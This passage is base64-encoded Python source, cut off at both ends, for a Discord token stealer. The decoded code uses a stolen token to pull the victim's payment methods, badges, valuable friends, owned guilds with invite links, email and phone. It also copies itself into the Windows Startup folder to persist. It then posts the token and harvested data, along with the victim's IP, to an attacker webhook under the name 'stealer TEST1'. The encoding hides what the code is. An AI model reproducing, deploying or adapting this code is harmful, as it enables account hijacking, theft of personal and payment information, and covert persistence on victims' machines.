ODExMTFONih0b2tlbik6CiAgICBoZWFkZXJzID0gewogICAgICAgICJBdXRob3JpemF0aW9uIjogdG9rZW4sCiAgICAgICAgIkNvbnRlbnQtVHlwZSI6ICJhcHBsaWNhdGlvbi9qc29uIiwKICAgICAgICAiVXNlci1BZ2VudCI6ICJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0OyBydjoxMDIuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDIuMCIKICAgIH0KICAgIHRyeToKICAgICAgICBiaWxsaW5nanNvbiA9IGxvYWRzKHVybG9wZW4oUmVxdWVzdCgiaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvdXNlcnMvQG1lL2JpbGxpbmcvcGF5bWVudC1zb3VyY2VzIiwgaGVhZGVycz1oZWFkZXJzKSkucmVhZCgpLmRlY29kZSgpKQogICAgZXhjZXB0OgogICAgICAgIHJldHVybiBGYWxzZQoKICAgIGlmIGJpbGxpbmdqc29uID09IFtdOiByZXR1cm4gImBOb25lYCIKCiAgICBiaWxsaW5nID0gIiIKICAgIGZvciBtZXRob2RlIGluIGJpbGxpbmdqc29uOgogICAgICAgIGlmIG1ldGhvZGVbImludmFsaWQiXSA9PSBGYWxzZToKICAgICAgICAgICAgaWYgbWV0aG9kZVsidHlwZSJdID09IDE6CiAgICAgICAgICAgICAgICBiaWxsaW5nICs9ICI6Y3JlZGl0X2NhcmQ6IgogICAgICAgICAgICBlbGlmIG1ldGhvZGVbInR5cGUiXSA9PSAyOgogICAgICAgICAgICAgICAgYmlsbGluZyArPSAiOnBhcmtpbmc6ICIKCiAgICByZXR1cm4gYmlsbGluZwoKZGVmIEczNzg0RDYzKGZsYWdzKToKICAgIGlmIGZsYWdzID09IDA6IHJldHVybiAnJwoKICAgIE93bmVkQmFkZ2VzID0gJycKICAgIGJhZGdlTGlzdCA9ICBbCiAgICAgICAgeyJOYW1lIjogJ0FjdGl2ZV9EZXZlbG9wZXInLCAgICAgICAgICAgICAgICAnVmFsdWUnOiA0MTk0MzA0LCAgICdFbW9qaSc6ICc8OmFjdGl2ZToxMDQ1MjgzMTMyNzk2MDYzNzk0PiAnfSwKICAgICAgICB7Ik5hbWUiOiAnRWFybHlfVmVyaWZpZWRfQm90X0RldmVsb3BlcicsICAgICdWYWx1ZSc6IDEzMTA3MiwgICAgJ0Vtb2ppJzogIjw6ZGV2ZWxvcGVyOjg3NDc1MDgwODQ3MjgyNTk4Nj4gIn0sCiAgICAgICAgeyJOYW1lIjogJ0J1Z19IdW50ZXJfTGV2ZWxfMicsICAgICAgICAgICAgICAnVmFsdWUnOiAxNjM4NCwgICAgICdFbW9qaSc6ICI8OmJ1Z2h1bnRlcl8yOjg3NDc1MDgwODQzMDg3NDY2ND4gIn0sCiAgICAgICAgeyJOYW1lIjogJ0Vhcmx5X1N1cHBvcnRlcicsICAgICAgICAgICAgICAgICAnVmFsdWUnOiA1MTIsICAgICAgICdFbW9qaSc6ICI8OmVhcmx5X3N1cHBvcnRlcjo4NzQ3NTA4MDg0MTQxMTM4MjM+ICJ9LAogICAgICAgIHsiTmFtZSI6ICdIb3VzZV9CYWxhbmNlJywgICAgICAgICAgICAgICAgICAgJ1ZhbHVlJzogMjU2LCAgICAgICAnRW1vamknOiAiPDpiYWxhbmNlOjg3NDc1MDgwODI2NzI5MjY4Mz4gIn0sCiAgICAgICAgeyJOYW1lIjogJ0hvdXNlX0JyaWxsaWFuY2UnLCAgICAgICAgICAgICAgICAnVmFsdWUnOiAxMjgsICAgICAgICdFbW9qaSc6ICI8OmJyaWxsaWFuY2U6ODc0NzUwODA4MzM4NjA4MTk5PiAifSwKICAgICAgICB7Ik5hbWUiOiAnSG91c2VfQnJhdmVyeScsICAgICAgICAgICAgICAgICAgICdWYWx1ZSc6IDY0LCAgICAgICAgJ0Vtb2ppJzogIjw6YnJhdmVyeTo4NzQ3NTA4MDgzODg5NTIwNzU+ICJ9LAogICAgICAgIHsiTmFtZSI6ICdCdWdfSHVudGVyX0xldmVsXzEnLCAgICAgICAgICAgICAgJ1ZhbHVlJzogOCwgICAgICAgICAnRW1vamknOiAiPDpidWdodW50ZXJfMTo4NzQ3NTA4MDg0MjY2OTI2NTg+ICJ9LAogICAgICAgIHsiTmFtZSI6ICdIeXBlU3F1YWRfRXZlbnRzJywgICAgICAgICAgICAgICAgJ1ZhbHVlJzogNCwgICAgICAgICAnRW1vamknOiAiPDpoeXBlc3F1YWRfZXZlbnRzOjg3NDc1MDgwODU5NDQ3NzA1Nj4gIn0sCiAgICAgICAgeyJOYW1lIjogJ1BhcnRuZXJlZF9TZXJ2ZXJfT3duZXInLCAgICAgICAgICAnVmFsdWUnOiAyLCAgICAgICAgICdFbW9qaSc6ICI8OnBhcnRuZXI6ODc0NzUwODA4Njc4MzU0OTY0PiAifSwKICAgICAgICB7Ik5hbWUiOiAnRGlzY29yZF9FbXBsb3llZScsICAgICAgICAgICAgICAgICdWYWx1ZSc6IDEsICAgICAgICAgJ0Vtb2ppJzogIjw6c3RhZmY6ODc0NzUwODA4NzI4NjY2MTUyPiAifQogICAgXQoKICAgIGZvciBiYWRnZSBpbiBiYWRnZUxpc3Q6CiAgICAgICAgaWYgZmxhZ3MgLy8gYmFkZ2VbIlZhbHVlIl0gIT0gMDoKICAgICAgICAgICAgT3duZWRCYWRnZXMgKz0gYmFkZ2VbIkVtb2ppIl0KICAgICAgICAgICAgZmxhZ3MgPSBmbGFncyAlIGJhZGdlWyJWYWx1ZSJdCgogICAgcmV0dXJuIE93bmVkQmFkZ2VzCgpkZWYgRzM3VUhRRnIxM05ENSh0b2tlbik6CiAgICBiYWRnZUxpc3QgPSAgWwogICAgICAgIHsiTmFtZSI6ICdBY3RpdmVfRGV2ZWxvcGVyJywgICAgICAgICAgICAgICAgJ1ZhbHVlJzogNDE5NDMwNCwgICAnRW1vamknOiAnPDphY3RpdmU6MTA0NTI4MzEzMjc5NjA2Mzc5ND4gJ30sCiAgICAgICAgeyJOYW1lIjogJ0Vhcmx5X1ZlcmlmaWVkX0JvdF9EZXZlbG9wZXInLCAgICAnVmFsdWUnOiAxMzEwNzIsICAgICdFbW9qaSc6ICI8OmRldmVsb3Blcjo4NzQ3NTA4MDg0NzI4MjU5ODY+ICJ9LAogICAgICAgIHsiTmFtZSI6ICdCdWdfSHVudGVyX0xldmVsXzInLCAgICAgICAgICAgICAgJ1ZhbHVlJzogMTYzODQsICAgICAnRW1vamknOiAiPDpidWdodW50ZXJfMjo4NzQ3NTA4MDg0MzA4NzQ2NjQ+ICJ9LAogICAgICAgIHsiTmFtZSI6ICdFYXJseV9TdXBwb3J0ZXInLCAgICAgICAgICAgICAgICAgJ1ZhbHVlJzogNTEyLCAgICAgICAnRW1vamknOiAiPDplYXJseV9zdXBwb3J0ZXI6ODc0NzUwODA4NDE0MTEzODIzPiAifSwKICAgICAgICB7Ik5hbWUiOiAnSG91c2VfQmFsYW5jZScsICAgICAgICAgICAgICAgICAgICdWYWx1ZSc6IDI1NiwgICAgICAgJ0Vtb2ppJzogIjw6YmFsYW5jZTo4NzQ3NTA4MDgyNjcyOTI2ODM+ICJ9LAogICAgICAgIHsiTmFtZSI6ICdIb3VzZV9CcmlsbGlhbmNlJywgICAgICAgICAgICAgICAgJ1ZhbHVlJzogMTI4LCAgICAgICAnRW1vamknOiAiPDpicmlsbGlhbmNlOjg3NDc1MDgwODMzODYwODE5OT4gIn0sCiAgICAgICAgeyJOYW1lIjogJ0hvdXNlX0JyYXZlcnknLCAgICAgICAgICAgICAgICAgICAnVmFsdWUnOiA2NCwgICAgICAgICdFbW9qaSc6ICI8OmJyYXZlcnk6ODc0NzUwODA4Mzg4OTUyMDc1PiAifSwKICAgICAgICB7Ik5hbWUiOiAnQnVnX0h1bnRlcl9MZXZlbF8xJywgICAgICAgICAgICAgICdWYWx1ZSc6IDgsICAgICAgICAgJ0Vtb2ppJzogIjw6YnVnaHVudGVyXzE6ODc0NzUwODA4NDI2NjkyNjU4PiAifSwKICAgICAgICB7Ik5hbWUiOiAnSHlwZVNxdWFkX0V2ZW50cycsICAgICAgICAgICAgICAgICdWYWx1ZSc6IDQsICAgICAgICAgJ0Vtb2ppJzogIjw6aHlwZXNxdWFkX2V2ZW50czo4NzQ3NTA4MDg1OTQ0NzcwNTY+ICJ9LAogICAgICAgIHsiTmFtZSI6ICdQYXJ0bmVyZWRfU2VydmVyX093bmVyJywgICAgICAgICAgJ1ZhbHVlJzogMiwgICAgICAgICAnRW1vamknOiAiPDpwYXJ0bmVyOjg3NDc1MDgwODY3ODM1NDk2ND4gIn0sCiAgICAgICAgeyJOYW1lIjogJ0Rpc2NvcmRfRW1wbG95ZWUnLCAgICAgICAgICAgICAgICAnVmFsdWUnOiAxLCAgICAgICAgICdFbW9qaSc6ICI8OnN0YWZmOjg3NDc1MDgwODcyODY2NjE1Mj4gIn0KICAgIF0KICAgIGhlYWRlcnMgPSB7CiAgICAgICAgIkF1dGhvcml6YXRpb24iOiB0b2tlbiwKICAgICAgICAiQ29udGVudC1UeXBlIjogImFwcGxpY2F0aW9uL2pzb24iLAogICAgICAgICJVc2VyLUFnZW50IjogIk1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQ7IHJ2OjEwMi4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwMi4wIgogICAgfQogICAgdHJ5OgogICAgICAgIGZyaWVuZGxpc3QgPSBsb2Fkcyh1cmxvcGVuKFJlcXVlc3QoImh0dHBzOi8vZGlzY29yZC5jb20vYXBpL3Y2L3VzZXJzL0BtZS9yZWxhdGlvbnNoaXBzIiwgaGVhZGVycz1oZWFkZXJzKSkucmVhZCgpLmRlY29kZSgpKQogICAgZXhjZXB0OgogICAgICAgIHJldHVybiBGYWxzZQoKICAgIHVocWxpc3QgPSAnJwogICAgZm9yIGZyaWVuZCBpbiBmcmllbmRsaXN0OgogICAgICAgIE93bmVkQmFkZ2VzID0gJycKICAgICAgICBmbGFncyA9IGZyaWVuZFsndXNlciddWydwdWJsaWNfZmxhZ3MnXQogICAgICAgIGZvciBiYWRnZSBpbiBiYWRnZUxpc3Q6CiAgICAgICAgICAgIGlmIGZsYWdzIC8vIGJhZGdlWyJWYWx1ZSJdICE9IDAgYW5kIGZyaWVuZFsndHlwZSddID09IDE6CiAgICAgICAgICAgICAgICBpZiBub3QgIkhvdXNlIiBpbiBiYWRnZVsiTmFtZSJdIGFuZCBub3QgYmFkZ2VbIk5hbWUiXSA9PSAiQWN0aXZlX0RldmVsb3BlciI6CiAgICAgICAgICAgICAgICAgICAgT3duZWRCYWRnZXMgKz0gYmFkZ2VbIkVtb2ppIl0KICAgICAgICAgICAgICAgIGZsYWdzID0gZmxhZ3MgJSBiYWRnZVsiVmFsdWUiXQogICAgICAgIGlmIE93bmVkQmFkZ2VzICE9ICcnOgogICAgICAgICAgICB1aHFsaXN0ICs9IGYie093bmVkQmFkZ2VzfSB8ICoqe2ZyaWVuZFsndXNlciddWyd1c2VybmFtZSddfSN7ZnJpZW5kWyd1c2VyJ11bJ2Rpc2NyaW1pbmF0b3InXX0qKiBgKHtmcmllbmRbJ3VzZXInXVsnaWQnXX0pYFxuIgogICAgcmV0dXJuIHVocWxpc3QgaWYgdWhxbGlzdCAhPSAnJyBlbHNlICJgTm8gSFEgRnJpZW5kcyBGb3VuZGAiCgpkZWYgRzM3VUhRNlUxMUQ1KHRva2VuKToKICAgIHRyeToKICAgICAgICB1aHFndWlsZHMgPSAnJwogICAgICAgIGhlYWRlcnMgPSB7CiAgICAgICAgICAgICJBdXRob3JpemF0aW9uIjogdG9rZW4sCiAgICAgICAgICAgICJDb250ZW50LVR5cGUiOiAiYXBwbGljYXRpb24vanNvbiIsCiAgICAgICAgICAgICJVc2VyLUFnZW50IjogIk1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQ7IHJ2OjEwMi4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwMi4wIgogICAgICAgIH0KICAgICAgICBndWlsZHMgPSBsb2Fkcyh1cmxvcGVuKFJlcXVlc3QoImh0dHBzOi8vZGlzY29yZC5jb20vYXBpL3Y5L3VzZXJzL0BtZS9ndWlsZHM/d2l0aF9jb3VudHM9dHJ1ZSIsIGhlYWRlcnM9aGVhZGVycykpLnJlYWQoKS5kZWNvZGUoKSkKICAgICAgICBmb3IgZ3VpbGQgaW4gZ3VpbGRzOgogICAgICAgICAgICBpZiBndWlsZFsiYXBwcm94aW1hdGVfbWVtYmVyX2NvdW50Il0gPCAxOiBjb250aW51ZQogICAgICAgICAgICBpZiBndWlsZFsib3duZXIiXSBvciBndWlsZFsicGVybWlzc2lvbnMiXSA9PSAiNDM5ODA0NjUxMTEwMyI6CiAgICAgICAgICAgICAgICBpbnYgPSBsb2Fkcyh1cmxvcGVuKFJlcXVlc3QoZiJodHRwczovL2Rpc2NvcmQuY29tL2FwaS92Ni9ndWlsZHMve2d1aWxkWydpZCddfS9pbnZpdGVzIiwgaGVhZGVycz1oZWFkZXJzKSkucmVhZCgpLmRlY29kZSgpKSAgICAKICAgICAgICAgICAgICAgIHRyeTogICAgY2MgPSAiaHR0cHM6Ly9kaXNjb3JkLmdnLyIrc3RyKGludlswXVsnY29kZSddKQogICAgICAgICAgICAgICAgZXhjZXB0OiBjYyA9IEZhbHNlCiAgICAgICAgICAgICAgICB1aHFndWlsZHMgKz0gZiI8OmJsYWNrYXJyb3c6MTA5NTc0MDk3NTE5Nzk5NTA0MT4gW3tndWlsZFsnbmFtZSddfV0gKip7c3RyKGd1aWxkWydhcHByb3hpbWF0ZV9tZW1iZXJfY291bnQnXSl9IE1lbWJlcnMqKlxuIgogICAgICAgIGlmIHVocWd1aWxkcyA9PSAnJzogcmV0dXJuICdgTm8gSFEgR3VpbGRzIEZvdW5kYCcKICAgICAgICByZXR1cm4gdWhxZ3VpbGRzCiAgICBleGNlcHQ6CiAgICAgICAgcmV0dXJuICdObyBIUSBHdWlsZHMgRm91bmQnCgpkZWYgRzM3NzBLM04xTkYwKHRva2VuKToKICAgIGhlYWRlcnMgPSB7CiAgICAgICAgIkF1dGhvcml6YXRpb24iOiB0b2tlbiwKICAgICAgICAiQ29udGVudC1UeXBlIjogImFwcGxpY2F0aW9uL2pzb24iLAogICAgICAgICJVc2VyLUFnZW50IjogIk1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQ7IHJ2OjEwMi4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwMi4wIgogICAgfQoKICAgIHVzZXJqc29uID0gbG9hZHModXJsb3BlbihSZXF1ZXN0KCJodHRwczovL2Rpc2NvcmRhcHAuY29tL2FwaS92Ni91c2Vycy9AbWUiLCBoZWFkZXJzPWhlYWRlcnMpKS5yZWFkKCkuZGVjb2RlKCkpCiAgICB1c2VybmFtZSA9IHVzZXJqc29uWyJ1c2VybmFtZSJdCiAgICBoYXNodGFnID0gdXNlcmpzb25bImRpc2NyaW1pbmF0b3IiXQogICAgZW1haWwgPSB1c2VyanNvblsiZW1haWwiXQogICAgaWRkID0gdXNlcmpzb25bImlkIl0KICAgIHBmcCA9IHVzZXJqc29uWyJhdmF0YXIiXQogICAgZmxhZ3MgPSB1c2VyanNvblsicHVibGljX2ZsYWdzIl0KICAgIG5pdHJvID0gIiIKICAgIHBob25lID0gIiIKCiAgICBpZiAicHJlbWl1bV90eXBlIiBpbiB1c2VyanNvbjoKICAgICAgICBuaXRyb3QgPSB1c2VyanNvblsicHJlbWl1bV90eXBlIl0KICAgICAgICBpZiBuaXRyb3QgPT0gMToKICAgICAgICAgICAgbml0cm8gPSAiPDpjbGFzc2ljOjg5NjExOTE3MTAxOTA2NzQyMz4gIgogICAgICAgIGVsaWYgbml0cm90ID09IDI6CiAgICAgICAgICAgIG5pdHJvID0gIjxhOmJvb3N0OjgyNDAzNjc3ODU3MDQxNjEyOT4gPDpjbGFzc2ljOjg5NjExOTE3MTAxOTA2NzQyMz4gIgogICAgaWYgInBob25lIiBpbiB1c2VyanNvbjogcGhvbmUgPSBmJ2B7dXNlcmpzb25bInBob25lIl19YCcgaWYgdXNlcmpzb25bInBob25lIl0gIT0gTm9uZSBlbHNlICJgTm9uZWAiCgogICAgcmV0dXJuIHVzZXJuYW1lLCBoYXNodGFnLCBlbWFpbCwgaWRkLCBwZnAsIGZsYWdzLCBuaXRybywgcGhvbmUKCmRlZiBDSDNDSzcwSzNOKHRva2VuKToKICAgIGhlYWRlcnMgPSB7CiAgICAgICAgIkF1dGhvcml6YXRpb24iOiB0b2tlbiwKICAgICAgICAiQ29udGVudC1UeXBlIjogImFwcGxpY2F0aW9uL2pzb24iLAogICAgICAgICJVc2VyLUFnZW50IjogIk1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQ7IHJ2OjEwMi4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwMi4wIgogICAgfQogICAgdHJ5OgogICAgICAgIHVybG9wZW4oUmVxdWVzdCgiaHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvdjYvdXNlcnMvQG1lIiwgaGVhZGVycz1oZWFkZXJzKSkKICAgICAgICByZXR1cm4gVHJ1ZQogICAgZXhjZXB0OgogICAgICAgIHJldHVybiBGYWxzZQoKaWYgZ2V0YXR0cihzeXMsICdmcm96ZW4nLCBGYWxzZSk6CiAgICBjdXJyZW50RmlsZVBhdGggPSBvcy5wYXRoLmRpcm5hbWUoc3lzLmV4ZWN1dGFibGUpCmVsc2U6CiAgICBjdXJyZW50RmlsZVBhdGggPSBvcy5wYXRoLmRpcm5hbWUob3MucGF0aC5hYnNwYXRoKF9fZmlsZV9fKSkKCmZpbGVOYW1lID0gb3MucGF0aC5iYXNlbmFtZShzeXMuYXJndlswXSkKZmlsZVBhdGggPSBvcy5wYXRoLmpvaW4oY3VycmVudEZpbGVQYXRoLCBmaWxlTmFtZSkKCnN0YXJ0dXBGb2xkZXJQYXRoID0gb3MucGF0aC5qb2luKG9zLnBhdGguZXhwYW5kdXNlcignficpLCAnQXBwRGF0YScsICdSb2FtaW5nJywgJ01pY3Jvc29mdCcsICdXaW5kb3dzJywgJ1N0YXJ0IE1lbnUnLCAnUHJvZ3JhbXMnLCAnU3RhcnR1cCcpCnN0YXJ0dXBGaWxlUGF0aCA9IG9zLnBhdGguam9pbihzdGFydHVwRm9sZGVyUGF0aCwgZmlsZU5hbWUpCgppZiBvcy5wYXRoLmFic3BhdGgoZmlsZVBhdGgpLmxvd2VyKCkgIT0gb3MucGF0aC5hYnNwYXRoKHN0YXJ0dXBGaWxlUGF0aCkubG93ZXIoKToKICAgIHdpdGggb3BlbihmaWxlUGF0aCwgJ3JiJykgYXMgc3JjX2ZpbGUsIG9wZW4oc3RhcnR1cEZpbGVQYXRoLCAnd2InKSBhcyBkc3RfZmlsZToKICAgICAgICBzaHV0aWwuY29weWZpbGVvYmooc3JjX2ZpbGUsIGRzdF9maWxlKQoKZGVmIFRyMU0ob2JqKToKICAgIGlmIGxlbihvYmopID4gMTAwMDogCiAgICAgICAgZiA9IG9iai5zcGxpdCgiXG4iKQogICAgICAgIG9iaiA9ICIiCiAgICAgICAgZm9yIGkgaW4gZjoKICAgICAgICAgICAgaWYgbGVuKG9iaikrIGxlbihpKSA+PSAxMDAwOiAKICAgICAgICAgICAgICAgIG9iaiArPSAiLi4uIgogICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICAgICAgb2JqICs9IGkgKyAiXG4iCiAgICByZXR1cm4gb2JqCgpkZWYgVVAxMDRENzBLM04odG9rZW4sIHBhdGgpOgogICAgZ2xvYmFsIGgwMGsKICAgIGhlYWRlcnMgPSB7CiAgICAgICAgIkNvbnRlbnQtVHlwZSI6ICJhcHBsaWNhdGlvbi9qc29uIiwKICAgICAgICAiVXNlci1BZ2VudCI6ICJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0OyBydjoxMDIuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDIuMCIKICAgIH0KICAgIHVzZXJuYW1lLCBoYXNodGFnLCBlbWFpbCwgaWRkLCBwZnAsIGZsYWdzLCBuaXRybywgcGhvbmUgPSBHMzc3MEszTjFORjAodG9rZW4pCgogICAgcGZwID0gZiJodHRwczovL2Nkbi5kaXNjb3JkYXBwLmNvbS9hdmF0YXJzL3tpZGR9L3twZnB9IiBpZiBwZnAgIT0gTm9uZSBlbHNlICJodHRwczovL21lZGlhLmRpc2NvcmRhcHAubmV0L2F0dGFjaG1lbnRzLzExMTEzNjQwMjQ0MDg0OTQxNDAvMTExMTM2NDE4MTAzMjE3Nzc2Ni9jcy5wbmciCiAgICBiaWxsaW5nID0gRzM3ODExMTFONih0b2tlbikKICAgIGJhZGdlID0gRzM3ODRENjMoZmxhZ3MpCiAgICBmcmllbmRzID0gVHIxTShHMzdVSFFGcjEzTkQ1KHRva2VuKSkKICAgIGd1aWxkcyA9IFRyMU0oRzM3VUhRNlUxMUQ1KHRva2VuKSkKICAgIGNvZGVzID0gVHIxTShHMzdDMEQzNSh0b2tlbikpCgogICAgaWYgY29kZXMgPT0gIiI6IGNvZGVzID0gImBObyBHaWZ0cyBGb3VuZGAiCiAgICBpZiBiaWxsaW5nID09ICIiOiBiaWxsaW5nID0gIjpsb2NrOiIKICAgIGlmIGJhZGdlID09ICIiIGFuZCBuaXRybyA9PSAiIjogYmFkZ2UsIG5pdHJvID0gIjpsb2NrOiIsICIiCiAgICBpZiBwaG9uZSA9PSAiIjogcGhvbmUgPSAiYE5vbmVgIgogICAgaWYgZnJpZW5kcyA9PSAiIjogZnJpZW5kcyA9ICI6bG9jazoiCiAgICBpZiBndWlsZHMgPT0gIiI6IGd1aWxkcyA9ICI6bG9jazoiCiAgICBwYXRoID0gcGF0aC5yZXBsYWNlKCJcXCIsICIvIikKCiAgICBkYXRhID0gewogICAgICAgICJjb250ZW50IjogZid7R0xJTkZPfSAqKkZvdW5kIGluKiogYHtwYXRofWAnLAogICAgICAgICJlbWJlZHMiOiBbCiAgICAgICAgICAgIHsKICAgICAgICAgICAgImNvbG9yIjogMjg5NTY2NywKICAgICAgICAgICAgImZpZWxkcyI6IFsKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAibmFtZSI6ICI8OmhhY2tlcmJsYWNrOjEwOTU3NDc0MTA1Mzk1OTM4MDA+IFRva2VuOiIsCiAgICAgICAgICAgICAgICAgICAgInZhbHVlIjogZiJge3Rva2VufWBcbltDbGljayB0byBjb3B5XShodHRwczovL3N1cGVyZnVycnljZG4ubmwvY29weS97dG9rZW59KSIKICAgICAgICAgICAgICAgIH0sCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgIm5hbWUiOiAiPDptYWlsOjEwOTU3NDEwMjQ2NzgxOTExMTQ+IEVtYWlsOiIsCiAgICAgICAgICAgICAgICAgICAgInZhbHVlIjogZiJge2VtYWlsfWAiLAogICAgICAgICAgICAgICAgICAgICJpbmxpbmUiOiBUcnVlCiAgICAgICAgICAgICAgICB9LAogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICJuYW1lIjogIjw6cGhvbmU6MTA5NTc0MTAyOTgzMjk5MDcyMD4gUGhvbmU6IiwKICAgICAgICAgICAgICAgICAgICAidmFsdWUiOiBmIntwaG9uZX0iLAogICAgICAgICAgICAgICAgICAgICJpbmxpbmUiOiBUcnVlCiAgICAgICAgICAgICAgICB9LAogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICJuYW1lIjogIjxhOmJsYWNrd29ybGQ6MTA5NTc0MTk4NDM4NTI5MDMxMD4gSVA6IiwKICAgICAgICAgICAgICAgICAgICAidmFsdWUiOiBmImB7RzM3MVAoKX1gIiwKICAgICAgICAgICAgICAgICAgICAiaW5saW5lIjogVHJ1ZQogICAgICAgICAgICAgICAgfSwKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAibmFtZSI6ICI8YTpibGFja2h5cGVzcXVhZDoxMDk1NzQyMzIzNDIzNDUzMjI0PiBCYWRnZXM6IiwKICAgICAgICAgICAgICAgICAgICAidmFsdWUiOiBmIntuaXRyb317YmFkZ2V9IiwKICAgICAgICAgICAgICAgICAgICAiaW5saW5lIjogVHJ1ZQogICAgICAgICAgICAgICAgfSwKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAibmFtZSI6ICI8YTpibGFja21vbmV5Y2FyZDoxMDk1NzQxMDI2ODUwODUyOTY1PiBCaWxsaW5nOiIsCiAgICAgICAgICAgICAgICAgICAgInZhbHVlIjogZiJ7YmlsbGluZ30iLAogICAgICAgICAgICAgICAgICAgICJpbmxpbmUiOiBUcnVlCiAgICAgICAgICAgICAgICB9LAogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICJuYW1lIjogIjw6ZnJpZW5kczoxMTExNDAxNjc2NTExOTI0NDQ4PiBIUSBGcmllbmRzOiIsCiAgICAgICAgICAgICAgICAgICAgInZhbHVlIjogZiJ7ZnJpZW5kc30iLAogICAgICAgICAgICAgICAgICAgICJpbmxpbmUiOiBGYWxzZQogICAgICAgICAgICAgICAgfSwKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAibmFtZSI6ICI8OmJsYWNrX2Nyb3duOjExODQ5MzgxNTMyOTE4MjkyODg+IEhRIEd1aWxkczoiLAogICAgICAgICAgICAgICAgICAgICJ2YWx1ZSI6IGYie2d1aWxkc30iLAogICAgICAgICAgICAgICAgICAgICJpbmxpbmUiOiBGYWxzZQogICAgICAgICAgICAgICAgfSwKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAibmFtZSI6ICI8OmJsYWNrX2dpZnQ6MTE4NDk3MTA5NTAwMzEwNzQ1MT4gR2lmdCBDb2RlczoiLAogICAgICAgICAgICAgICAgICAgICJ2YWx1ZSI6IGYie2NvZGVzfSIsCiAgICAgICAgICAgICAgICAgICAgImlubGluZSI6IEZhbHNlCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBdLAogICAgICAgICAgICAiYXV0aG9yIjogewogICAgICAgICAgICAgICAgIm5hbWUiOiBmInt1c2VybmFtZX0je2hhc2h0YWd9ICh7aWRkfSkiLAogICAgICAgICAgICAgICAgImljb25fdXJsIjogZiJ7cGZwfSIKICAgICAgICAgICAgICAgIH0sCiAgICAgICAgICAgICJmb290ZXIiOiB7CiAgICAgICAgICAgICAgICAidGV4dCI6IGYie2Zvb3RlcmN9IiwKICAgICAgICAgICAgICAgICJpY29uX3VybCI6ICJodHRwczovL21lZGlhLmRpc2NvcmRhcHAubmV0L2F0dGFjaG1lbnRzLzExMTEzNjQwMjQ0MDg0OTQxNDAvMTExMTM2NDE4MTAzMjE3Nzc2Ni9jcy5wbmciCiAgICAgICAgICAgICAgICB9LAogICAgICAgICAgICAidGh1bWJuYWlsIjogewogICAgICAgICAgICAgICAgInVybCI6IGYie3BmcH0iCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICBdLAogICAgICAgICJ1c2VybmFtZSI6IGYic3RlYWxlciBURVNUMSIsCiAgICAgICAgImF2YXRhcl91cmwiOiAiaHR0cHM6Ly9tZWRpYS5kaXNjb3JkYXBwLm5ldC9hdHRhY2htZW50cy8xMTExMzY0MDI0NDA4NDk0MTQwLzExMTEzNjQxODEwMzIxNzc3NjYvY3MucG5nIiwKICAgICAgICAiYXR0YWNobWVudHMiOiBbXQogICAgICAgIH0KICAgIEwwNERVcjExOChoMDBrLCBkYXRhPWR1bXBzKGRhdGEpLmVuY29kZSgpLCBoZWFkZXJzPWhlYWRlcnMpCgpkZWYgcjNGMHJNNDcobGlzdHQpOgogICAgZSA9IHJlLmZpbmRhbGwoIihcdytbYS16XSkiLGxpc3R0KQogICAgd2hpbGUgImh0dHBzIiBpbiBlOiBlLnJlbW92ZSgiaHR0cHMiKQogICAgd2hpbGUgImNvbSIgaW4gZTogZS5yZW1vdmUoImNvbSIpCiAgICB3aGlsZSAibmV0IiBpbiBlOiBlLnJlbW92ZSgibmV0IikKICAgIHJldHVybiBsaXN0KHNldChlKSkKCmRlZiBVUDEwNEQobmFtZSwgbGluayk6CiAgICBoZWFkZXJzID0gewogICAgICAgICJDb250ZW50LVR5cGUiOiAiYXBwbGljYXRpb24vanNvbiIsCiAgICAgICAgIlVzZXItQWdlbnQiOiAiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NDsgcnY6MTAyLjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTAyLjAiCiAgICB9CgogICAgaWYgIkRhdGEgU2VhcmNoZXIiIGluIG5hbWU6CiAgICAgICAgZGF0YSA9IHsKICAgICAgICAgICAgImNvbnRlbnQiOiBHTElORk8sCiAgICAgICAgICAgICJlbWJlZHMiOiBbCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICJ0aXRsZSI6IGYie2NuYW1lfSB8IERhdGEgRXh0cmFjdG9yIiwKICAgICAgICAgICAgICAgICJjb2xvciI6IDI4OTU2NjcsCiAgICAgICAgICAgICAgICAiZmllbGRzIjogbGluaywKICAgICAgICAgICAgICAgICJmb290ZXIiOiB7CiAgICAgICAgICAgICAgICAgICAgInRleHQiOiBmIntmb290ZXJjfSIsCiAgICAgICAgICAgICAgICAgICAgImljb25fdXJsIjogImh0dHBzOi8vbWVkaWEuZGlzY29yZGFwcC5uZXQvYXR0YWNobWVudHMvM